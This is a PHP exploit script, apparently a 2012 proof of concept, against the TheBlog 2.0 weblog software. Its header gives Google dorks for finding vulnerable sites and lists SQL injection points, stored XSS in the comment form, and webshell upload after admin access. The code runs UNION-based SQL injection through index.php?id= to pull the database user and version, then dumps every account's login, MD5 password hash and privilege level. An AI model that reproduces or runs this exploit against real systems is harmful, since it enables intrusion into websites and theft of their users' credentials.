<?php
# Exploit Title: TheBlog <= 2.0 SQL Injection
# Exploit author: WhiteCollarGroup
# Google Dork: intext:"TheBlog é um software livre e é distribuido sobre a licença GNU/GPL "
# Google Dork: intext:"TheBlog PHP weblogger"
# Date: 10th 06 2012
# Software Link: http://phpbrasil.com/script/JHnpFRmSBqlf/sn-news
# Software homepage: http://theblog.codigolivre.org.br/
# Version: 2.0
# Tested on: Debian GNU/Linux,Windows 7 Ultimate (Apache Server)
 
/*
 
WhiteCollarGroup
    www.wcgroup.host56.com
    whitecollar_group@hotmail.com
    @WCollarGroup
 
-+-
    If you will try to hack your own server for test, and will install on a MySQL >= 5, on SQL codes to insert, you must replace all:
    TYPE=MyISAM
    By:
    ENGINE=InnoDB
-+-
 
We discovered multiple vulnerabilities on this system. All in index.php, vars:
 
~> SQL Injection
    index.php?id=[sqli]
    index.php?cat=[sqli]
    index.php?archives=[sqli without "-"]
 
~> XSS Persistent (stored)
    When reading a post, click "Deixe um comentário" (leave an comment).
    In comment form, you have:
    Nome: [XSS]
    E-mail: [XSS]
    Message: [XSS]
    Inputs "Nome" and "E-mail" are limited to 255 max chars. Input "Message" haven't limit.
    You can inject HTML and JavaScript code.
 
~> Arbitraty File Upload
    After get admin access, on the menu, click "Upload".
    Upload your webshell on the form. A link will be appears on file list ("Lista de Arquivos").
     
 > What's this exploit?
    Are a PoC for SQL Injection on "index.php?id=".
    How to use:
    php exploit.php <target>
    Example:
    php exploit.php http://target.com/blog/
     
     
EDUCATIONAL PURPOSE ONLY!
*/
 
error_reporting(E_ERROR);
set_time_limit(0);
ini_set("default_socket_timeout", 30);
  
function hex($string){
    $hex=''; // PHP 'Dim' =]
    for ($i=0; $i < strlen($string); $i++){
        $hex .= dechex(ord($string[$i]));
    }
    return '0x'.$hex;
}
 
 
echo "TheBlog <= 2.0 SQL Injection exploit\n";
echo "Discovered and written by WhiteCollarGroup\n";
echo "www.wcgroup.host56.com - whitecollar_group@hotmail.com\n\n";
 
if($argc!=2) {
    echo "Usage: \n";
    echo "php $argv[0] <target url>\n";
    echo "Example:\n";
    echo "php $argv[0] http://www.website.com/blog\n";
    exit;
}
 
$target = $argv[1];
if(substr($target, (strlen($target)-1))!="/") {
    $target .= "/";
}
 
$inject = $target . "index.php?id=".urlencode("-0' ");
 
echo "[*] Trying to get informations...\n";
$token = uniqid();
$token_hex = hex($token);
 
// http://localhost/cms/theblog/theblog2-0/index.php?id=-62%27%20UNION%20ALL%20SELECT%201,2,3,4,5,concat%28login,0x3c3d3e,senha,0x3c3d3e,nivel%29,7,8,9,10,11,12,13%20from%20theblog_users%20LIMIT%200,1--+
 
$infos = file_get_contents($inject.urlencode("union all select 1,2,3,4,5,concat($token_hex,user(),$token_hex,version(),$token_hex),7,8,9,10,11,12,13-- "));
$infos_r = array();
 
preg_match_all("/$token(.*)$token(.*)$token/", $infos, $infos_r);
$user = $infos_r[1][0];
$version = $infos_r[2][0];
if($user) {
    echo "[!] MySQL version: $version\n";
    echo "[!] MySQL user: $user\n";
} else {
    echo "[-] Error while getting informations.\n";
}
 
echo "[*] Getting users...\n";
$i = 0;
while(true) {
    $dados_r = array();
    $dados = file_get_contents($inject.urlencode("union all select 1,2,3,4,5,concat($token_hex,login,$token_hex,senha,$token_hex,nivel,$token_hex),7,8,9,10,11,12,13 FROM theblog_users LIMIT $i,1-- "));
    preg_match_all("/$token(.*)$token(.*)$token(.*)$token/", $dados, $dados_r);
    $login = $dados_r[1][0];
    $senha = $dados_r[2][0];
    $nivel = $dados_r[3][0];
    if(($login) OR ($senha) OR ($nivel)) {
        echo "    -+-\n";
        echo "    User: $login\n"
            ."    Pass (MD5): $senha\n"
            ."    Level: ".($nivel=="1" ? "admin" : "poster")."\n";
        $i++;
    } else {
        break;
    }
}
 
if($i!=0) {
    echo "[!] Admin login: {$target}admin.php\n";
} else {
    echo "[-] Exploit failed. Make sure that's server is using a valid version of TheBlog without Apache mod_security.\nWe're sorry.\n";
}
